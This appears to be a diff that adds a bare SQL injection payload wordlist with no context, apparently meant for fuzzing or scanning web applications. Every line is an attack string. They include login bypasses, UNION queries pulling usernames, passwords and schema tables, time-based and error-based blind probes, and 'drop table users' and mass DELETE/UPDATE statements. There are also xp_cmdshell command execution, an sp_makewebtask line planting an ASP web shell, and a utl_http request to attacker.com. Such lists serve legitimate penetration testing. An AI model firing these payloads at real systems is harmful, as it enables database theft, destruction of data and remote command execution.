@@ -1,0 +1,176 @@
+'
+''
+`
+``
+,
+"
+""
+/
+//
+\
+\\
+;
+' or '1'='1
+' or '1'='1'--
+' or '1'='1'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1
+') or ('1'='1
+" or "1"="1
+" or 1=1--
+" or 1=1#
+1' or '1'='1
+1' or '1'='1'--
+1' or 1=1--
+1' or 1=1#
+1" or "1"="1
+1" or 1=1--
+admin'--
+admin'#
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+'--
+'#
+'/*
+' --
+' #
+' /*
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+' OR '1'='1
+' OR '1'='1'--
+' OR 1=1
+' OR 1=1--
+" OR "1"="1
+" OR 1=1--
+1 OR 1=1
+1 OR 1=1--
+; drop table users--
+'; drop table users--
+'; drop table users;--
+'; drop table users; --
+1; drop table users--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT 1,2,3--
+' UNION SELECT username,password FROM users--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+' AND 1=1
+' AND 1=2
+' AND '1'='1
+' AND '1'='2
+1' AND 1=1--
+1' AND 1=2--
+' AND sleep(5)--
+' AND sleep(5)#
+' OR sleep(5)--
+' OR sleep(5)#
+1 AND sleep(5)
+1 AND sleep(5)--
+'; WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:5'#
+1; WAITFOR DELAY '0:0:5'--
+' AND BENCHMARK(10000000,MD5(1))--
+' OR BENCHMARK(10000000,MD5(1))--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)#
+' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' AND IF(1=1,SLEEP(5),0)--
+' AND IF(1=2,SLEEP(5),0)--
+' OR IF(1=1,SLEEP(5),0)--
+1' AND IF(1=1,SLEEP(5),0)--
+1 AND 1=1
+1 AND 1=2
+1 AND 1=1--
+1 AND 1=2--
+1 and 1=1
+1 and 1=2
+1' and '1'='1
+1' and '1'='2
+1' and 1=1--
+1' and 1=2--
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 10--
+' ORDER BY 100--
+1 ORDER BY 1--
+1 ORDER BY 2--
+1 ORDER BY 3--
+' GROUP BY 1--
+' GROUP BY 2--
+' HAVING 1=1--
+' HAVING 1=2--
+' INTO OUTFILE '/tmp/test.txt'--
+' INTO DUMPFILE '/tmp/test.txt'--
+'; INSERT INTO users(username,password) VALUES('hacked','hacked')--
+'; UPDATE users SET password='hacked' WHERE 1=1--
+'; DELETE FROM users WHERE 1=1--
+admin' OR 1=1--
+admin' OR '1'='1
+admin'--
+admin' --
+admin'#
+1' OR '1'='1'--
+1' OR 1=1--
+1' OR 1=1#
+x' OR 'x'='x
+x' OR 1=1--
+x' OR 1=1#
+x') OR ('x'='x
+x') OR (1=1)--
+x') OR (1=1)#
+x') OR ('1'='1
+' RLIKE (SELECT (CASE WHEN (1=1) THEN 0x28 ELSE 0x29 END))--
+' RLIKE (SELECT (CASE WHEN (1=2) THEN 0x28 ELSE 0x29 END))--
+' AND extractvalue(1,concat(0x7e,(SELECT version())))--
+' AND updatexml(1,concat(0x7e,(SELECT version())),1)--
+' AND exp(~(SELECT*FROM(SELECT version())x))--
+' OR 1 GROUP BY CONCAT_WS(0x3a,version(),FLOOR(RAND(0)*2)) HAVING MIN(0) OR 1--
+' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a707a71,(SELECT (ELT(1=1,1))),0x71786b7171,0x78))s), 8446744073709551610, 8446744073709551610)))--
+1 EXEC xp_cmdshell('dir')
+1; EXEC xp_cmdshell('dir')--
+1' EXEC xp_cmdshell('dir')--
+'; EXEC sp_executesql N'SELECT @@version'--
+1 EXEC sp_makewebtask 'c:\inetpub\wwwroot\test.asp','select ''<%execute(request("cmd"))%>'''
+'; EXECUTE IMMEDIATE 'SELECT 1 FROM dual'--
+' AND 1=utl_http.request('http://attacker.com/')--
+' AND 1=(SELECT 1 FROM pg_sleep(5))--
+' AND (SELECT 1 FROM pg_sleep(5))>0--
+'; SELECT pg_sleep(5)--
+' AND dbms_pipe.receive_message(('a'),5) FROM dual--
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+1%27
+1%22
+1%3B
+1%27%20OR%20%271%27%3D%271
+1%27%20OR%201%3D1--
+%27%20OR%20%271%27%3D%271
+%27%20AND%20%271%27%3D%271
+%27%20AND%20%271%27%3D%272
+%27%20OR%201%3D1--%20
+%22%20OR%201%3D1--%20
+%27%3B%20DROP%20TABLE%20users--%20
+\' OR 1=1--
+\' OR \'1\'=\'1
+\" OR 1=1--
+\" OR \"1\"=\"1
+\x27 OR 1=1--
+\x22 OR 1=1--
+\u0027 OR 1=1--
+\u0022 OR 1=1--
+0x27 OR 1=1--
+0x22 OR 1=1--
